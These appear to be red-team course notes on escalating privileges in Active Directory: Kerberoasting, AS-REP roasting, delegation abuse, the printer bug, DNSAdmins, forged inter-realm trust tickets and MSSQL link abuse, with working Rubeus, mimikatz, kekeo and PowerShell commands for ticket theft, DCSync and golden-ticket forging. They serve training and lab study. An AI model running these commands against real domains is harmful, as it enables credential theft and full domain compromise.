### Domain Privilege Escalation - Kerberoast
* In active directory environment, any SPN represents a service.
* In active directory environment, every user object that has SPN considered as service account.
* The Kerberos session ticket (TGS) has a server portion which is encrypted with the NTLM hash of the service account.
* This makes it possible to request a ticket and do offline password attack.
* Password hashes of service accounts could be used to create silver tickets.
* Machine accounts password are strong, set by computer.
* Service accounts password may be weak, set by humans.
* **We target user accounts which has SPNs so we can request a TGS ticket for this user account, and this TGS ticket contains the service account's NTLM hash which is user account's NTLM hash.**
* `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`: Find user objects used as service accounts.
* `Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt`: Extract objects that has SPNs.
- Most of the interesting services use machine account as the service account.
- We want user accounts that are treated as service accounts.
- For the domain controller, any user object has Service Principal Name (SPN) is treated as service account.
- "krbtgt" account always has SPN.
### Domain Privilege Escalation - Targeted Kerberoasting
* If a User object's UserAccountControl settings have "Do not required Kerberos preauthentication" enabled. It is possible to grab the user's crackable AS-REP and brute-force it offline.
* **When Kerberos Preauth is disabled for a user, we can request a TGT ticket for that user and get hash from that TGT ticket's.** Basically, TGT ticket are encrypted with the user's NTLM hash rather than KRBTGT user's NTLM hash.
* `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`: Enumerating accounts with Kerberos Preauth disabled.
* With sufficient rights(GenericWrite or GenericAll), Kerberos preauth can be forced disabled for a victim user as well.
- With sufficient rights, a target user's SPN can be set to anything. We can then request a TGS ticket, the TGS can then be "kerberoasted".
- `Set-ADUser -Identity <user-that-we-have-permission> -ServicePrincipalNames @{Add="ops/whatever"}`: Setting a SPN for a user object in Active Directory.
### Domain Privilege Escalation - Kerberos Delegation
* Kerberos Delegation allows to "reuse the end-user credentials to access resources hosted on a different server".
- This is typically useful in multi-tier service or applications where Kerberos Double Hop is required.
- **For example, users authenticate to a web-server and web-server makes requests to a database server.**
    - **The web server can request access to resources on the database server as the user and not as the web server's service account.**
    - **Web server uses delegation to impersonate client user on web-server to connect database server as client user**.
- There are two types of Kerberos Delegation:
    - **Unconstrained Delegation** allows the first hop server (web server in our example) to request access to **ANY service on ANY computer** in the FOREST.
    - **Constrained Delegation** allows the first hop server (web server in our example) to request access ONLY TO **SPECIFIED services on SPECIFIED computers**.
        - If the user is not using Kerberos Preauthentication to authenticate to the first hop server(web-server in our example), Windows offers Protocol Transition to transition the request to Kerberos.
- In both types of delegations, a mechanism is required to impersonate the incoming user and authenticate to the second hop server(database server in our example) as the user.
### Domain Privilege Escalation - Unconstrained Delegation
- When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user.
- When unconstrained delegation is enabled, the domain controller places the user's TGT inside TGS.
- Unconstrained delegation is something useful when you compromise the first hop that is the machine where delegation is enabled
- When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS process on the first-hop computer.
- This way the server can reuse the user's TGT to access any other resources as the user.
- **This could be used to escalate privileges in case we can compromise the computer with unconstrained delegation once a domain admin connects to that compromised machine**.
- **When unconstrained delegation is enabled on an user/computer where SPN attribute is set, the user sends TGT inside of TGS to a service so first hop server can use this TGT after extracting TGS to authenticate DC and the first hop server sends TGS to second hop server.**
- **If we have local administrative privileges on computers where Unconstrained Delegation is enabled, we can extract tickets from the server and use this ticket to connect unconstrained-delegation enabled servers**.
* `Get-ADComputer -Filter {TrustedForDelegation -eq $True}`: Finding domain computers which have unconstrained delegation enabled. 
* `Get-ADUser -Filter {TrustedForDelegation -eq $True}`: Finding domain users which have unconstrained delegation enabled.
* `"sekurlsa::tickets /export"`: Export tickets from first-hop server.
* If we don't have any high-privileged user ticket, we should wait for a domain admin to connect a service on the compromised machine.
* `"kerberos::ptt <domain-admin-ticket.kirbi>"`: Escalating privileges to domain admin with pass the ticket.
* We can use this DA ticket to connect any service on any computer, because unconstrained delegation is enabled on the compromised server being a computer object, we can use DA ticket to connect domain controller.
### Domain Privilege Escalation - Constrained Delegation
* When enabled constrained delegation on a service account, it allows access only to specified services on specified computers as a user.
- A typical scenario where constrained delegation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.
- In this scenario, user's credentials are passed S4U extension to convert credentials to ticket.
- **To impersonate the user, Service for User(S4U) extension is used when non-Kerberos compatible authentication mechanism is used to authenticate to DC from web-server** which provides two extensions: (Kerberos Extension)
    - **Service for User to Self** (S4U2self) allows a service to obtain a forwardable TGS to itself on a behalf of a user with just the user principal name without supplying a password. The service account must have the TRUSTED_TO_AUTHENTİCATE_FOR_DELEGATION. T2A4D UserAccountControl attribute.
    - **Service for User to Proxy** (S4Uproxy) allows a service to obtain a TGS to a second service on behalf of a user. The second service is controlled by "msDS-AllowedToDelegate" attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.
- `Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`: Enumerate objects where constrained delegation is enabled.

- Either plaintext or NTLM hash of the delegation object's is required. 
- `kekeo# tgt::ask /user:<username> /rc4:<user-NTLM-hash> /domain:<domain>`:  To request a TGT ticket
- `kekeo# tgs::s4u /tgt:<tgt.kirbi> /user:<Impersonated-User>@<domain> /service:<delegated-service>/<domain>|ldap/<dc-FQDN>`: Getting TGS ticket to access ldap service.
- `"kerberos::ptt ticket.kirbi"`: Uploading ticket from disk to LSASS process to authenticate the service. 
- `"lsadump::dcsync"`: Because we have LDAP service access TGS ticket, we can execute a DCSync attack.
- Kerberos just checks specified service name, but it does not check other protocols of specified service.

**Printer Bug**
- A feature of MS-RPRN which allows any domain user (authenticated user) can force any machine (running the Spooler service) to connect to second machine which is a machine of the domain user's choice.
- `Rubeus.exe monitor /interval:5 /nowrap`
- `MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local`
### Domain Privilege Escalation - DNSAdmins
- It is possible for the members of the "DNSAdmins" group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).
- In case the DC also serves as DNS, this will provide us escalation to DA.
- This technique needs privileges to restart the DNS service.
* `Get-ADGroupMember -Identity DNSAdmins`: Enumerate users who a part of DNSAdmins group.
### Domain Privilege Escalation - Across Trusts
- Across Domains: Implicit two way trust relationship.
- Across Forests: Trust relationship needs to be established.
- Microsoft considers Forest as a security boundary.

 **Child Domain to Parent Domain**
 * Domain admin to Enterprise Admin
- We are targeting a user in Enterprise Admins or Domain Admins in Parent Domain.
- Domains in the same forest have an implicit two-way trust with other domains.
- **sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get new SID and the old SID is added to sIDHistory.**
- We would inject SID History for the 5.1.9 which is a well-known SID for the Enterprise Admins group.
- **We are going to extract the trust key and then forge it an inter-realm TGT where we inject a SID history of an enterprise admin.**
- There is a trust key between the parent and child domains.
- Inter-realm TGT is encrypted using the trust key. That is the trust key shared between domain contollers
- There are two ways of escalating privileges between two domains of the same forest:
    - Krbtgt hash
    - Trust tickets
- **If we try to access any services on the parent domain, DC responds inter-realm TGT ticket rather than TGS ticket. This inter-realm TGT ticket can be used on parent domain's domain controller to generate a TGS ticket. So we get TGS ticket from parent domain and we can use this ticket to access the service inside of parent domain.**
- **This inter-realm TGT is signed and encrypted with trust key**.
- **Domain Controllers just only checks if the ticket can be decrypted with trust key or not.**
- **Trust key is in the child domain's domain controller machine's LSASS process**.
- **Trust key is the machine account's RC4 key named parent domain**.
- The trust key allows to create a inter-realm TGT which is a TGT works on parent domain controller.
* Extracting Trust key from Child Domain: 
	* `"lsadump::trust /patch"`: Execute on child DC with administrator privileges so you can get trust keys. Check for parent domain's trust key.
* So we create a TGT which contains an enterprise admin SID and we can get access to a service as enterprise admin.
* `"kerberos::golden /user:Administrator /domain:<child-domain> /sid:<current-domain-sid> /sids:<enterprise-admins-groups-parent-domain-sid> /rc4:<trust-key> /service:krbtgt /target:<parent-domain> /ticket:trust_tkt.kirbi"'`: To forge a inter-realm TGT ticket for Administrator user to access parent domain's any services including HOST, RPCSS, LDAP etc.
* Services for tickets: **HOST and RPCSS for WMI, HTTP for Powershell Remoting and WinRm.**
**Exploitation 1 with forged Inter-Realm TGT Tickets**
- Get a TGS for a service (CIFS below) in the parent domain by using the forged TGT 
	- `asktgs.exe trust_tkt.kirbi CIFS/<parentdomainDC-FQDN>`
- Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for WinRM) can be created as well.
- `kirbikator.exe lsa .\ticket.kirbi`: To inject ticket from file to memory.
- `klist`: Check tickets
- `ls \\parent-dc.domain.fqdn\c$`: To access filesystem of the DC. (CIFS service)
- **If a single child domain was compromised which means getting access to domain admins, all forest will be compromised**.
**Exploitation 2 with KRBTGT Hash**
- `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
- TODO: I will explain in detail.

**Forest to Forest**
- sIDfiltering mechanism blocks the same trust key in the different forests.
- Since from 500 to 1000 SIDs are system reserved objects, User-Created objects always have SIDs greater than 1000. And sIDFiltering blocks system reserved objects' SID range.
- **That is why a forest called security boundary.**
- We cannot escalate to enterprise admin for other forest by injecting Enterprise Admin SID.
- **Every two forest needs at least some trusts to share services**.
- **Look for shares, services that has trust relationships between forests.**
- `net view \\eurocorp.dc.eurocorp.local`: To list fileshares on domain controller in different forest.
# Domain Privilege Escalation - External Trusts
- Kerberos authentication works similar to child-parent domain.
- We cannot abuse sIDHistory because there are 2 different forest. And each forest has their own SID filtering mechanism.

* `"lsadump::trust /patch"` -> Extracting trust key, **check external trust machine account hashes**.
* `"kerberos::golden /user:Administrator /domain:<child-domain> /sid:<current-domain-sid> /sids:<enterprise-admins-groups-parent-domain-sid> /rc4:<trust-key> /service:krbtgt /target:<external-domain> /ticket:trust_tkt.kirbi"`: To generate a TGT ticket. 
`kirbikator.exe lsa .\FQDN.kirbi` -> To inject ticket from file to memory.
- After ticket is inject the memory, we can use ticket to access resources.

# Domain Privilege Escalation - MSSQL Servers
* We are in information security are so privileges are just a mean to access information. If you can extract information without having high privileges, that's the best scenario.
- MSSQL servers are generally deployed in plenty in a Windows domain.
- PowerUpSQL is a tool for MSSQL abuse.
* PowerUp Cmdlets: 
	* `Get-SQLInstanceDomain`: List all SQL servers by checking SPNs in Active Directory.
	* `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`: Get basic information about SQL server.
- **A database link allows a SQL server to access external data sources like other SQL servers and OLE DB data sources.**
- In case of database links between SQL servers, linked SQL servers is possible to execute stored procedures.
- Database links work even there is no forest trust.
* `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose`: Get MSSQL server database links recursive.
- On the target server, we must have xp_cmdshell function enabled to execute commands on the target database server operating system.

